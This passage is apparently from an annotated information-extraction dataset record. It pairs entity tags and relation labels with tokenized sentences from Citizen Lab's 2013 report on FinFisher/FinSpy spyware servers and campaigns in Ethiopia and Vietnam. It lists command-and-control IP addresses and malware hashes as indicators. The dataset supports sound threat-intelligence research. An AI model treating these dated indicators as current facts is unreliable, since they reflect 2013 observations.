"Address"}], [{"name": "Bangladesh", "pos": [4, 5], "sent_id": 75, "type": "Country"}], [{"name": "168.144.xxx.xxx", "pos": [5, 6], "sent_id": 75, "type": "Address"}], [{"name": "Canada", "pos": [9, 10], "sent_id": 75, "type": "Country"}], [{"name": "168.144.xxx.xxx", "pos": [10, 11], "sent_id": 75, "type": "Address"}], [{"name": "Canada", "pos": [14, 15], "sent_id": 75, "type": "Country"}], [{"name": "217.16.xxx.xxx", "pos": [15, 16], "sent_id": 75, "type": "Address"}], [{"name": "Czech Republic", "pos": [18, 20], "sent_id": 75, "type": "Country"}], [{"name": "217.146.xxx.xxx", "pos": [20, 21], "sent_id": 75, "type": "Address"}], [{"name": "Estonia", "pos": [26, 27], "sent_id": 75, "type": "Country"}], [{"name": "213.55.99.74", "pos": [27, 28], "sent_id": 75, "type": "Address"}], [{"name": "Estonia", "pos": [30, 31], "sent_id": 75, "type": "Country"}], [{"name": "80.156.xxx.xxx", "pos": [31, 32], "sent_id": 75, "type": "Address"}], [{"name": "Germany", "pos": [35, 36], "sent_id": 75, "type": "Country"}], [{"name": "37.200.xxx.xxx", "pos": [36, 37], "sent_id": 75, "type": "Address"}], [{"name": "Germany", "pos": [39, 40], "sent_id": 75, "type": "Country"}], [{"name": "178.77.xxx.xxx", "pos": [46, 47], "sent_id": 75, "type": "Address"}], [{"name": "Germany", "pos": [2, 3], "sent_id": 76, "type": "Country"}], [{"name": "119.18.xxx.xxx", "pos": [3, 4], "sent_id": 76, "type": "Address"}], [{"name": "India", "pos": [5, 6], "sent_id": 76, "type": "Country"}], [{"name": "119.18.xxx.xxx", "pos": [6, 7], "sent_id": 76, "type": "Address"}], [{"name": "India", "pos": [0, 1], "sent_id": 77, "type": "Country"}], [{"name": "118.97.xxx.xxx", "pos": [1, 2], "sent_id": 77, "type": "Address"}], [{"name": "Indonesia", "pos": [4, 5], "sent_id": 77, "type": "Country"}], [{"name": "118.97.xxx.xxx", "pos": [5, 6], "sent_id": 77, "type": "Address"}], [{"name": "Indonesia", "pos": [8, 9], "sent_id": 77, "type": "Country"}], [{"name": "103.28.xxx.xxx", "pos": [9, 10], "sent_id": 77, "type": "Address"}], [{"name": "Indonesia", "pos": [13, 14], "sent_id": 77, "type": "Country"}], [{"name": "112.78.143.34", "pos": [14, 15], "sent_id": 77, "type": "Address"}], [{"name": "Indonesia", "pos": [17, 18], "sent_id": 77, "type": "Country"}], [{"name": "112.78.143.26", "pos": [18, 19], "sent_id": 77, "type": "Address"}], [{"name": "Indonesia", "pos": [21, 22], "sent_id": 77, "type": "Country"}], [{"name": "117.121.xxx.xxx", "pos": [22, 23], "sent_id": 77, "type": "Address"}], [{"name": "Malaysia", "pos": [24, 25], "sent_id": 77, "type": "Country"}], [{"name": "187.188.xxx.xxx", "pos": [25, 26], "sent_id": 77, "type": "Address"}], [{"name": "Mexico", "pos": [28, 29], "sent_id": 77, "type": "Country"}], [{"name": "201.122.xxx.xxx", "pos": [29, 30], "sent_id": 77, "type": "Address"}], [{"name": "Mexico", "pos": [31, 32], "sent_id": 77, "type": "Country"}], [{"name": "164.138.xxx.xxx", "pos": [32, 33], "sent_id": 77, "type": "Address"}], [{"name": "Netherlands", "pos": [34, 35], "sent_id": 77, "type": "Country"}], [{"name": "164.138.28.2", "pos": [35, 36], "sent_id": 77, "type": "Address"}], [{"name": "Netherlands", "pos": [37, 38], "sent_id": 77, "type": "Country"}], [{"name": "78.100.57.165", "pos": [38, 39], "sent_id": 77, "type": "Address"}], [{"name": "Qatar", "pos": [43, 44], "sent_id": 77, "type": "Country"}], [{"name": "195.178.xxx.xxx", "pos": [44, 45], "sent_id": 77, "type": "Address"}], [{"name": "Serbia", "pos": [49, 50], "sent_id": 77, "type": "Country"}], [{"name": "117.121.xxx.xxx", "pos": [50, 51], "sent_id": 77, "type": "Address"}], [{"name": "Singapore", "pos": [52, 53], "sent_id": 77, "type": "Country"}], [{"name": "217.174.229.82", "pos": [53, 54], "sent_id": 77, "type": "Address"}], [{"name": "Turkmenistan", "pos": [57, 58], "sent_id": 77, "type": "Country"}], [{"name": "72.22.xxx.xxx", "pos": [58, 59], "sent_id": 77, "type": "Address"}], [{"name": "United States", "pos": [62, 64], "sent_id": 77, "type": "Country"}], [{"name": "166.143.xxx.xxx", "pos": [64, 65], "sent_id": 77, "type": "Address"}], [{"name": "United States", "pos": [67, 69], "sent_id": 77, "type": "Country"}], [{"name": "117.121.xxx.xxx", "pos": [69, 70], "sent_id": 77, "type": "Address"}], [{"name": "United States", "pos": [71, 73], "sent_id": 77, "type": "Country"}], [{"name": "117.121.xxx.xxx", "pos": [73, 74], "sent_id": 77, "type": "Address"}], [{"name": "United States", "pos": [75, 77], "sent_id": 77, "type": "Country"}], [{"name": "117.121.xxx.xxx", "pos": [77, 78], "sent_id": 77, "type": "Address"}], [{"name": "United States", "pos": [79, 81], "sent_id": 77, "type": "Country"}], [{"name": "117.121.xxx.xxx", "pos": [81, 82], "sent_id": 77, "type": "Address"}], [{"name": "United States", "pos": [83, 85], "sent_id": 77, "type": "Country"}], [{"name": "183.91.xxx.xxx", "pos": [85, 86], "sent_id": 77, "type": "Address"}], [{"name": "Vietnam", "pos": [90, 91], "sent_id": 77, "type": "Country"}], [{"name": "GPLHost", "pos": [15, 16], "sent_id": 78, "type": "Organization"}], [{"name": "Singapore", "pos": [20, 21], "sent_id": 78, "type": "Country"}], [{"name": "Malaysia", "pos": [22, 23], "sent_id": 78, "type": "Country"}], [{"name": "Australia", "pos": [24, 25], "sent_id": 78, "type": "Country"}], [{"name": "US", "pos": [26, 27], "sent_id": 78, "type": "Country"}], [{"name": "Germany", "pos": [5, 6], "sent_id": 80, "type": "Country"}], [{"name": "Martin Muench", "pos": [23, 25], "sent_id": 80, "type": "Person"}], [{"name": "FinSpy", "pos": [3, 4], "sent_id": 82, "type": "Campaign"}], [{"name": "Verizon Wireless", "pos": [12, 14], "sent_id": 82, "type": "Organization"}], [{"name": "Qatar", "pos": [4, 5], "sent_id": 84, "type": "Country"}], [{"name": "Rapid7", "pos": [10, 11], "sent_id": 84, "type": "Organization"}], [{"name": "http://qhotels.gov.qa/", "pos": [10, 11], "sent_id": 86, "type": "Indicator"}], [{"name": "ETHIOPIA", "pos": [0, 1], "sent_id": 87, "type": "ExploitTargetObject"}], [{"name": "VIETNAM", "pos": [2, 3], "sent_id": 87, "type": "ExploitTargetObject"}], [{"name": "FinSpy", "pos": [12, 13], "sent_id": 87, "type": "Campaign"}], [{"name": "August 2012", "pos": [20, 22], "sent_id": 90, "type": "Time"}], [{"name": "213.55.99.74", "pos": [22, 23], "sent_id": 92, "type": "Address"}], [{"name": "213.55.99.0", "pos": [25, 26], "sent_id": 92, "type": "Address"}], [{"name": "March 2013", "pos": [30, 32], "sent_id": 93, "type": "Time"}], [{"name": "Bahrain", "pos": [17, 18], "sent_id": 94, "type": "Country"}], [{"name": "Turkmenistan", "pos": [19, 20], "sent_id": 94, "type": "Country"}], [{"name": "8ae2febe04102450fdbc26a38037c82b", "pos": [1, 2], "sent_id": 95, "type": "MD5"}], [{"name": "1fd0a268086f8d13c6a3262d41cce13470886b09", "pos": [1, 2], "sent_id": 96, "type": "SHA-1"}], [{"name": "ff6f0bcdb02a9a1c10da14a0844ed6ec6a68c13c04b4c122afc559d606762fa", "pos": [3, 4], "sent_id": 96, "type": "SHA-256"}], [{"name": "FinSpy", "pos": [14, 15], "sent_id": 96, "type": "Malware"}], [{"name": "2012", "pos": [22, 23], "sent_id": 96, "type": "Time"}], [{"name": "2011-07-05 08:25:31", "pos": [15, 21], "sent_id": 99, "type": "Time"}], [{"name": "ba21e452ee5ff3478f21b293a134b30ebf6b7f4ec03f8c8153202a740d7978b2", "pos": [9, 10], "sent_id": 101, "type": "SHA-256"}], [{"name": "62bde3bac3782d36f9f2e56db097a4672e70463e11971fad5de060b191efb196", "pos": [11, 12], "sent_id": 102, "type": "SHA-256"}], [{"name": "Ginbot 7", "pos": [15, 17], "sent_id": 105, "type": "ExploitTargetObject"}], [{"name": "FinSpy", "pos": [4, 5], "sent_id": 108, "type": "Malware"}], [{"name": "FinSpy Mobile for Android", "pos": [12, 16], "sent_id": 111, "type": "Malware"}], [{"name": "Vietnam", "pos": [10, 11], "sent_id": 112, "type": "Country"}], [{"name": "FinFisher", "pos": [1, 2], "sent_id": 113, "type": "MalwareFamily"}], [{"name": "FinSpy", "pos": [8, 9], "sent_id": 113, "type": "Malware"}], [{"name": "iOS", "pos": [14, 15], "sent_id": 113, "type": "Software"}], [{"name": "Android", "pos": [16, 17], "sent_id": 113, "type": "Software"}], [{"name": "Windows Mobile", "pos": [18, 20], "sent_id": 113, "type": "Software"}], [{"name": "Symbian", "pos": [21, 22], "sent_id": 113, "type": "Software"}], [{"name": "Blackberry", "pos": [23, 24], "sent_id": 113, "type": "Software"}], [{"name": "FinSpy", "pos": [10, 11], "sent_id": 114, "type": "Malware"}], [{"name": "Bahrain", "pos": [13, 14], "sent_id": 114, "type": "Country"}], [{"name": "573ef0b7ff1dab2c3f785ee46c51a54f", "pos": [1, 2], "sent_id": 118, "type": "MD5"}], [{"name": "d58d4f6ad3235610bafba677b762f3872b0f67cb", "pos": [3, 4], "sent_id": 118, "type": "SHA-1"}], [{"name": "363172a2f2b228c7b00b614178e4ffa00a3a124200ceef4e6d7edb25a4696345", "pos": [5, 6], "sent_id": 118, "type": "SHA-256"}], [{"name": "183.91.2.199", "pos": [3, 4], "sent_id": 122, "type": "Address"}], [{"name": "183.91.0.0", "pos": [6, 7], "sent_id": 122, "type": "Address"}], [{"name": "183.91.9.255", "pos": [8, 9], "sent_id": 122, "type": "Address"}], [{"name": "Vietnam", "pos": [16, 17], "sent_id": 122, "type": "Country"}], [{"name": "Guido Westerwelle", "pos": [11, 13], "sent_id": 148, "type": "Person"}], [{"name": "Marietje Schaake", "pos": [37, 39], "sent_id": 148, "type": "Person"}]], "labels": [{"r": "P22", "h": 31, "t": 4, "evidence": [4, 9]}, {"r": "P27", "h": 31, "t": 3, "evidence": [3, 9]}, {"r": "P22", "h": 31, "t": 4, "evidence": [4, 9]}, {"r": "P22", "h": 31, "t": 2, "evidence": [3, 9]}, {"r": "P22", "h": 31, "t": 4, "evidence": [4, 9]}, {"r": "P27", "h": 31, "t": 32, "evidence": [9]}, {"r": "P27", "h": 31, "t": 33, "evidence": [9]}, {"r": "P22", "h": 34, "t": 35, "evidence": [12, 13]}, {"r": "P27", "h": 34, "t": 36, "evidence": [12, 13]}, {"r": "P32", "h": 38, "t": 39, "evidence": [17]}, {"r": "P27", "h": 44, "t": 42, "evidence": [19, 21]}, {"r": "P32", "h": 44, "t": 47, "evidence": [21, 22]}, {"r": "P32", "h": 54, "t": 56, "evidence": [27, 30]}, {"r": "P31", "h": 71, "t": 72, "evidence": [42]}, {"r": "P27", "h": 74, "t": 75, "evidence": [47]}, {"r": "P27", "h": 74, "t": 76, "evidence": [47]}, {"r": "P27", "h": 83, "t": 84, "evidence": [55, 58]}, {"r": "P27", "h": 83, "t": 85, "evidence": [55, 58]}, {"r": "P27", "h": 83, "t": 86, "evidence": [55, 58]}, {"r": "P27", "h": 83, "t": 87, "evidence": [55, 58]}, {"r": "P27", "h": 83, "t": 88, "evidence": [55, 58]}, {"r": "P27", "h": 83, "t": 89, "evidence": [55, 58]}, {"r": "P27", "h": 83, "t": 90, "evidence": [55, 58]}, {"r": "P27", "h": 95, "t": 91, "evidence": [63, 64]}, {"r": "P27", "h": 95, "t": 92, "evidence": [63, 64]}, {"r": "P27", "h": 95, "t": 93, "evidence": [63, 64]}, {"r": "P27", "h": 95, "t": 94, "evidence": [63, 64]}, {"r": "P27", "h": 207, "t": 205, "evidence": [87]}, {"r": "P27", "h": 207, "t": 206, "evidence": [87]}, {"r": "P33", "h": 217, "t": 219, "evidence": [96, 99]}, {"r": "P21", "h": 216, "t": 217, "evidence": [96]}, {"r": "P21", "h": 215, "t": 217, "evidence": [96]}, {"r": "P21", "h": 214, "t": 217, "evidence": [95, 96]}, {"r": "P33", "h": 217, "t": 218, "evidence": [96]}, {"r": "P21", "h": 220, "t": 217, "evidence": [96, 101]}, {"r": "P21", "h": 221, "t": 217, "evidence": [96, 102]}, {"r": "P16", "h": 226, "t": 227, "evidence": [113]}, {"r": "P14", "h": 227, "t": 226, "evidence": [113]}, {"r": "P21", "h": 235, "t": 224, "evidence": [111, 118]}, {"r": "P21", "h": 236, "t": 224, "evidence": [111, 118]}, {"r": "P21", "h": 237, "t": 224, "evidence": [111, 118]}, {"r": "P28", "h": 2, "t": 127, "evidence": [3, 73]}, {"r": "P28", "h": 2, "t": 125, "evidence": [3, 73]}, {"r": "P28", "h": 2, "t": 129, "evidence": [3, 74]}, {"r": "P28", "h": 2, "t": 131, "evidence": [3, 75]}, {"r": "P28", "h": 2, "t": 133, "evidence": [3, 75]}, {"r": "P28", "h": 2, "t": 135, "evidence": [3, 75]}, {"r": "P28", "h": 2, "t": 137, "evidence": [3, 75]}, {"r": "P28", "h": 2, "t": 139, "evidence": [3, 75]}, {"r": "P28", "h": 2, "t": 141, "evidence": [3, 75]}, {"r": "P28", "h": 2, "t": 143, "evidence": [3, 75]}, {"r": "P28", "h": 2, "t": 145, "evidence": [3, 75]}, {"r": "P28", "h": 2, "t": 147, "evidence": [3, 76]}, {"r": "P28", "h": 2, "t": 149, "evidence": [3, 76]}, {"r": "P28", "h": 2, "t": 151, "evidence": [3, 77]}, {"r": "P28", "h": 2, "t": 153, "evidence": [3, 77]}, {"r": "P28", "h": 2, "t": 155, "evidence": [3, 77]}, {"r": "P28", "h": 2, "t": 157, "evidence": [3, 77]}, {"r": "P28", "h": 2, "t": 159, "evidence": [3, 77]}, {"r": "P28", "h": 2, "t": 161, "evidence": [3, 77]}, {"r": "P28", "h": 2, "t": 163, "evidence": [3, 77]}, {"r": "P28", "h": 2, "t": 165, "evidence": [3, 77]}, {"r": "P28", "h": 2, "t": 167, "evidence": [3, 77]}, {"r": "P28", "h": 2, "t": 169, "evidence": [3, 77]}, {"r": "P28", "h": 2, "t": 171, "evidence": [3, 77]}, {"r": "P28", "h": 2, "t": 173, "evidence": [3, 77]}, {"r": "P28", "h": 2, "t": 175, "evidence": [3, 77]}, {"r": "P28", "h": 2, "t": 177, "evidence": [3, 77]}, {"r": "P28", "h": 2, "t": 179, "evidence": [3, 77]}, {"r": "P28", "h": 2, "t": 181, "evidence": [3, 77]}, {"r": "P28", "h": 2, "t": 183, "evidence": [3, 77]}, {"r": "P28", "h": 2, "t": 185, "evidence": [3, 77]}, {"r": "P28", "h": 2, "t": 187, "evidence": [3, 77]}, {"r": "P28", "h": 2, "t": 189, "evidence": [3, 77]}, {"r": "P28", "h": 2, "t": 191, "evidence": [3, 77]}, {"r": "P28", "h": 2, "t": 209, "evidence": [3, 92]}, {"r": "P28", "h": 2, "t": 210, "evidence": [3, 92]}, {"r": "P28", "h": 2, "t": 238, "evidence": [3, 122]}, {"r": "P28", "h": 2, "t": 239, "evidence": [3, 122]}, {"r": "P28", "h": 2, "t": 240, "evidence": [3, 122]}, {"r": "P27", "h": 31, "t": 99, "evidence": [9, 65]}, {"r": "P27", "h": 31, "t": 100, "evidence": [9, 65]}, {"r": "P27", "h": 31, "t": 101, "evidence": [9, 65]}, {"r": "P27", "h": 31, "t": 102, "evidence": [9, 65]}, {"r": "P27", "h": 31, "t": 103, "evidence": [9, 65]}, {"r": "P27", "h": 31, "t": 104, "evidence": [9, 65]}, {"r": "P27", "h": 31, "t": 105, "evidence": [9, 65]}, {"r": "P27", "h": 31, "t": 106, "evidence": [9, 65]}, {"r": "P27", "h": 31, "t": 107, "evidence": [9, 65]}, {"r": "P27", "h": 31, "t": 108, "evidence": [9, 65]}, {"r": "P27", "h": 31, "t": 109, "evidence": [9, 65]}, {"r": "P27", "h": 31, "t": 110, "evidence": [9, 65]}, {"r": "P27", "h": 31, "t": 111, "evidence": [9, 65]}, {"r": "P27", "h": 31, "t": 112, "evidence": [9, 65]}, {"r": "P27", "h": 31, "t": 113, "evidence": [9, 65]}, {"r": "P27", "h": 31, "t": 114, "evidence": [9, 65]}, {"r": "P27", "h": 31, "t": 115, "evidence": [9, 65]}, {"r": "P27", "h": 31, "t": 116, "evidence": [9, 65]}, {"r": "P27", "h": 31, "t": 117, "evidence": [9, 65]}, {"r": "P27", "h": 31, "t": 118, "evidence": [9, 65]}, {"r": "P27", "h": 31, "t": 119, "evidence": [9, 65]}, {"r": "P27", "h": 31, "t": 120, "evidence": [9, 65]}], "title": "201303CitizenLabFinFisher", "sents": [["Research", "Brief", "Number", "15", "\u2013", "March", "2013", "The", "Citizen", "Lab", "You", "Only", "Click", "Twice", ":"], ["FinFisher", "\u2019s", "Global", "Proliferation", "Morgan", "Marquis", "-", "Boire", ",", "Bill", "Marczak", ",", "Claudio", "Guarnieri", ",", "and", "John", "Scott", "-", "Railton", "."], ["This", "post", "describes", "the", "results", "of", "a", "comprehensive", "global", "Internet", "scan", "for", "the", "command", "and", "control", "servers", "of", "FinFisher", "\u2019s", "surveillance", "software", "."], ["It", "also", "details", "the", "discovery", "of", "a", "campaign", "using", "FinFisher", "in", "Ethiopia", "used", "to", "target", "individuals", "linked", "to", "an", "opposition", "group", "."], ["Additionally", ",", "it", "provides", "examination", "of", "a", "FinSpy", "Mobile", "sample", "found", "in", "the", "wild", ",", "which", "appears", "to", "have", "been", "used", "in", "Vietnam", "."], ["1", "."], ["SUMMARY", "OF", "KEY", "FINDINGS", "\uf0b7"], ["We", "have", "found", "command", "and", "control", "servers", "for", "FinSpy", "backdoors", ",", "part", "of", "Gamma", "International", "\u2019s"], ["FinFisher", "\u201c", "remote", "monitoring", "solution", ",", "\u201d", "in", "a", "total", "of", "25", "countries", ":", "Australia", ",", "Bahrain", ",", "Bangladesh", ",", "Brunei", ",", "Canada", ",", "Czech", "Republic", ",", "Estonia", ",", "Ethiopia", ",", "Germany", ",", "India", ",", "Indonesia", ",", "Japan", ",", "Latvia", ",", "Malaysia", ",", "Mexico", ",", "Mongolia", ",", "Netherlands", ",", "Qatar", ",", "Serbia", ",", "Singapore", ",", "Turkmenistan", ",", "United", "Arab", "Emirates", ",", "United", "Kingdom", ",", "United", "States", ",", "Vietnam", "."], ["\uf0b7", "A", "FinSpy", "campaign", "in", "Ethiopia", "uses", "pictures", "of", "Ginbot", "7", ",", "an", "Ethiopian", "opposition", "group", ",", "as", "bait", "to", "infect", "users", "."], ["This", "continues", "the", "theme", "of", "FinSpy", "deployments", "with", "strong", "indications", "of", "politicallymotivated", "targeting", "."], ["\uf0b7"], ["There", "is", "strong", "evidence", "of", "a", "Vietnamese", "FinSpy", "Mobile", "Campaign", "."], ["We", "found", "an", "Android", "FinSpy", "Mobile", "sample", "in", "the", "wild", "with", "a", "command", "&", "control", "server", "in", "Vietnam", "that", "also", "exfiltrates", "text", "messages", "to", "a", "local", "phone", "number", "."], ["\uf0b7", "These", "findings", "call", "into", "question", "claims", "by", "Gamma", "International", "that", "previously", "reported", "servers", "were", "not", "part", "of", "their", "product", "line", ",", "and", "that", "previously", "discovered", "copies", "of", "their", "software", "were", "either", "stolen", "or", "demo", "copies", "."], ["1", "Number", "15", "\u2013", "March", "2013", "2", "."], ["BACKGROUND", "AND", "INTRODUCTION"], ["FinFisher", "is", "a", "line", "of", "remote", "intrusion", "and", "surveillance", "software", "developed", "by", "Munich", "-", "based", "Gamma", "International", "GmbH.", "FinFisher", "products", "are", "marketed", "and", "sold", "exclusively", "to", "law", "enforcement", "and", "intelligence", "agencies", "by", "the", "UK", "-", "based", "Gamma", "Group.1"], ["Although", "touted", "as", "a", "\u201c", "lawful", "interception", "\u201d", "suite", "for", "monitoring", "criminals", ",", "FinFisher", "has", "gained", "notoriety", "because", "it", "has", "been", "used", "in", "targeted", "attacks", "against", "human", "rights", "campaigners", "and", "opposition", "activists", "in", "countries", "with", "questionable", "human", "rights", "records.2"], ["In", "late", "July", "2012", ",", "we", "published", "the", "results", "of", "an", "investigation", "into", "a", "suspicious", "e", "-", "mail", "campaign", "targeting", "Bahraini", "activists.3", "We", "analyzed", "the", "attachments", "and", "discovered", "that", "they", "contained", "the", "FinSpy", "spyware", ","], ["FinFisher", "\u2019s", "remote", "monitoring", "product", "."], ["FinSpy", "captures", "information", "from", "an", "infected", "computer", ",", "such", "as", "passwords", "and", "Skype", "calls", ",", "and", "sends", "the", "information", "to", "a", "FinSpy", "command", "&", "control", "(", "C2", ")", "server", "."], ["The", "attachments", "we", "analyzed", "sent", "data", "to", "a", "command", "&", "control", "server", "inside", "Bahrain", "."], ["This", "discovery", "motivated", "researchers", "to", "search", "for", "other", "command", "&", "control", "servers", "to", "understand", "how", "widely", "FinFisher", "might", "be", "used", "."], ["Claudio", "Guarnieri", "at", "Rapid7", "(", "one", "of", "the", "authors", "of", "this", "report", ")", "was", "the", "first", "to", "search", "for", "these", "servers", "."], ["He", "fingerprinted", "the", "Bahrain", "server", "and", "looked", "at", "historical", "Internet", "scanning", "data", "to", "identify", "other", "servers", "around", "the", "world", "that", "responded", "to", "the", "same", "fingerprint", "."], ["Rapid7", "published", "this", "list", "of", "servers", ",", "and", "described", "their", "fingerprinting", "technique", "."], ["Other", "groups", ",", "including", "CrowdStrike", "and", "SpiderLabs", "also", "analyzed", "and", "published", "reports", "on", "FinSpy", "."], ["Immediately", "after", "publication", ",", "the", "servers", "were", "apparently", "updated", "to", "evade", "detection", "by", "the", "Rapid7", "fingerprint", "."], ["We", "devised", "a", "different", "fingerprinting", "technique", "and", "scanned", "portions", "of", "the", "internet", "."], ["We", "confirmed", "Rapid7", "\u2019s", "results", ",", "and", "also", "found", "several", "new", "servers", ",", "including", "one", "inside", "Turkmenistan", "\u2019s", "Ministry", "of", "Communications", "."], ["We", "published", "our", "list", "of", "servers", "in", "late", "August", "2012", ",", "in", "addition", "to", "an", "analysis", "of", "mobile", "phone", "versions", "of", "FinSpy", "."], ["FinSpy", "servers", "were", "apparently", "updated", "again", "in", "October", "2012", "to", "disable", "this", "newer", "fingerprinting", "technique", ",", "although", "it", "was", "never", "publicly", "described", "."], ["Nevertheless", ",", "via", "analysis", "of", "existing", "samples", "and", "observation", "of", "command", "&", "control", "servers", ",", "we", "managed", "to", "enumerate", "yet", "more", "fingerprinting", "methods", "and", "continue", "our", "survey", "of", "the", "internet", "for", "this", "surveillance", "software", "."], ["We", "describe", "the", "results", "in", "this", "post", "."], ["Civil", "society", "groups", "have", "found", "cause", "for", "concern", "in", "these", "findings", ",", "as", "they", "indicate", "the", "use", "of", "FinFisher", "products", "by", "countries", "like", "Turkmenistan", "and", "Bahrain", "with", "problematic", "records", "on", "human", "rights", ",", "transparency", ",", "and", "rule", "of", "law", "."], ["In", "an", "August", "2012", "response", "to", "a", "letter", "from", "UK", "-", "based", "NGO", "Privacy", "International", ",", "the", "UK", "Government", "revealed", "that", "at", "some", "unspecified", "time", "in", "the", "past", ",", "it", "had", "examined", "a", "version", "of", "FinSpy", ",", "and", "communicated", "to", "Gamma", "that", "a", "license", "would", "be", "required", "to", "export", "that", "version", "outside", "of", "the", "EU", "."], ["Gamma", "has", "repeatedly", "denied", "links", "to", "spyware", "and", "servers", "uncovered", "by", "our", "research", ",", "claiming", "that", "the", "servers", "detected", "by", "our", "scans", "are", "\u201c", "not", "\u2026", "from", "the", "FinFisher", "product", "line", "."], ["\u201d4"], ["Gamma", "also", "claims", "that", "the", "spyware", "sent", "to", "activists", "in", "Bahrain", "was", "an", "\u201c", "old", "\u201d", "demonstration", "version", "of", "FinSpy", ",", "stolen", "during", "a", "product", "presentation", "."], ["In", "February", "2013", ",", "Privacy", "International", ",", "the", "European", "Centre", "for", "Constitutional", "and", "Human", "Rights", "(", "ECCHR", ")", ",", "the", "Bahrain", "Center", "for", "Human", "Rights", ",", "Bahrain", "Watch", ",", "and", "Reporters", "Without", "Borders", "filed", "a", "complaint", "with", "the", "Organization", "for", "Economic", "Cooperation", "and", "Development", "(", "OECD", ")", ",", "requesting", "that", "this", "body", "investigate", "whether", "Gamma", "violated", "OECD", "Guidelines", "for", "Multinational", "Enterprises", "by", "exporting", "FinSpy", "to", "Bahrain", "."], ["2", "Number", "15", "\u2013", "March", "2013"], ["The", "complaint", "called", "previous", "Gamma", "statements", "into", "question", ",", "noting", "that", "at", "least", "two", "different", "versions", "(", "4.00", "and", "4.01", ")", "of", "FinSpy", "were", "found", "in", "Bahrain", ",", "and", "that", "Bahrain", "\u2019s", "server", "was", "a", "FinFisher", "product", "and", "was", "likely", "receiving", "updates", "from", "Gamma", "."], ["This", "complaint", ",", "as", "laid", "out", "by", "Privacy", "International", "states", "that", "Gamma", ":", "\uf0b7", "failed", "to", "respect", "the", "internationally", "recognised", "human", "rights", "of", "those", "affected", "by", "[", "its", "]", "activities", "\uf0b7", "caused", "and", "contributed", "to", "adverse", "human", "rights", "impacts", "in", "the", "course", "of", "[", "its", "]", "business", "activities", "\uf0b7", "failed", "to", "prevent", "and", "mitigate", "adverse", "human", "rights", "impacts", "linked", "to", "[", "its", "]", "activities", "and", "products", ",", "and", "failed", "to", "address", "such", "impacts", "where", "they", "have", "occurred", "\uf0b7", "failed", "to", "carry", "out", "adequate", "due", "diligence", "(", "including", "human", "rights", "due", "diligence", ")", ";", "and", "\uf0b7", "failed", "to", "implement", "a", "policy", "commitment", "to", "respect", "human", "rights", "."], ["According", "to", "recent", "reporting", ",", "German", "Federal", "Police", "appear", "to", "have", "plans", "to", "purchase", "and", "use", "the", "FinFisher", "suite", "of", "tools", "domestically", "within", "Germany.5", "Meanwhile", ",", "findings", "by", "our", "group", "and", "others", "continue", "to", "illustrate", "the", "global", "proliferation", "of", "FinFisher", "\u2019s", "products", "."], ["Research", "continues", "to", "uncover", "troubling", "cases", "of", "FinSpy", "in", "countries", "with", "dismal", "human", "rights", "track", "records", ",", "and", "politically", "repressive", "regimes", "."], ["Most", "recently", ",", "work", "by", "Bahrain", "Watch", "has", "confirmed", "the", "presence", "of", "a", "Bahraini", "FinFisher", "campaign", ",", "and", "further", "contradicted", "Gamma", "\u2019s", "public", "statements", "."], ["This", "post", "adds", "to", "the", "list", "by", "providing", "an", "updated", "list", "of", "FinSpy", "Command", "&", "Control", "servers", ",", "and", "describing", "the", "FinSpy", "malware", "samples", "in", "the", "wild", "which", "appear", "to", "have", "been", "used", "to", "target", "victims", "in", "Ethiopia", "and", "Vietnam", "."], ["We", "present", "these", "updated", "findings", "in", "the", "hopes", "that", "we", "will", "further", "encourage", "civil", "society", "groups", "and", "competent", "investigative", "bodies", "to", "continue", "their", "scrutiny", "of", "Gamma", "\u2019s", "activities", ",", "relevant", "export", "control", "issues", ",", "and", "the", "issue", "of", "the", "global", "and", "unregulated", "proliferation", "of", "surveillance", "malware", "."], ["3", "Number", "15", "\u2013", "March", "2013", "FINFISHER", ":", "UPDATED", "GLOBAL", "SCAN", "Figure", "1", "."], ["Map", "of", "global", "FinFisher", "proliferation", "Around", "October", "2012", ",", "we", "observed", "that", "the", "behavior", "of", "FinSpy", "servers", "began", "to", "change", "."], ["Servers", "stopped", "responding", "to", "our", "fingerprint", ",", "which", "had", "exploited", "a", "quirk", "in", "the", "distinctive", "FinSpy", "wire", "protocol", "."], ["We", "believe", "that", "this", "indicates", "that", "Gamma", "either", "independently", "changed", "the", "FinSpy", "protocol", ",", "or", "was", "able", "to", "determine", "key", "elements", "of", "our", "fingerprint", ",", "although", "it", "has", "never", "been", "publicly", "revealed", "."], ["In", "the", "wake", "of", "this", "apparent", "update", "to", "FinSpy", "command", "&", "control", "servers", ",", "we", "devised", "a", "new", "fingerprint", "and", "conducted", "a", "scan", "of", "the", "internet", "for", "FinSpy", "command", "&", "control", "servers", "."], ["This", "scan", "took", "roughly", "two", "months", "and", "involved", "sending", "more", "than", "12", "billion", "packets", "."], ["Our", "new", "scan", "identified", "a", "total", "of", "36", "FinSpy", "servers", ",", "30", "of", "which", "were", "new", "and", "6", "of", "which", "we", "had", "found", "during", "previous", "scanning", "."], ["The", "servers", "operated", "in", "19", "different", "countries", "."], ["Among", "the", "FinSpy", "servers", "we", "found", ",", "7", "were", "in", "countries", "we", "had", "n\u2019t", "seen", "before", "."], ["New", "Countries", "Canada", ",", "Bangladesh", ",", "India", ",", "Malaysia", ",", "Mexico", ",", "Serbia", ",", "Vietnam"], ["4", "Number", "15", "\u2013", "March", "2013"], ["In", "our", "most", "recent", "scan", ",", "16", "servers", "that", "we", "had", "previously", "found", "did", "not", "show", "up", "."], ["We", "suspect", "that", "after", "our", "earlier", "scans", "were", "published", "the", "operators", "moved", "them", "."], ["Many", "of", "these", "servers", "were", "shut", "down", "or", "relocated", "after", "the", "publication", "of", "previous", "results", ",", "but", "before", "the", "apparent", "October", "2012", "update", "."], ["We", "no", "longer", "found", "FinSpy", "servers", "in", "4", "countries", "where", "previous", "scanning", "identified", "them", "(", "Brunei", ",", "UAE", ",", "Latvia", ",", "and", "Mongolia", ")", "."], ["Taken", "together", ",", "FinSpy", "servers", "are", "currently", ",", "or", "have", "been", "present", ",", "in", "25", "countries", "."], ["Australia", ",", "Bahrain", ",", "Bangladesh", ",", "Brunei", ",", "Canada", ",", "Czech", "Republic", ",", "Estonia", ",", "Ethiopia", ",", "Germany", ",", "India", ",", "Indonesia", ",", "Japan", ",", "Latvia", ",", "Malaysia", ",", "Mexico", ",", "Mongolia", ",", "Netherlands", ",", "Qatar", ",", "Serbia", ",", "Singapore", ",", "Turkmenistan", ",", "United", "Arab", "Emirates", ",", "United", "Kingdom", ",", "United", "States", ",", "Vietnam", "."], ["Importantly", ",", "we", "believe", "that", "our", "list", "of", "servers", "is", "incomplete", "due", "to", "the", "large", "diversity", "of", "ports", "used", "by", "FinSpy", "servers", ",", "as", "well", 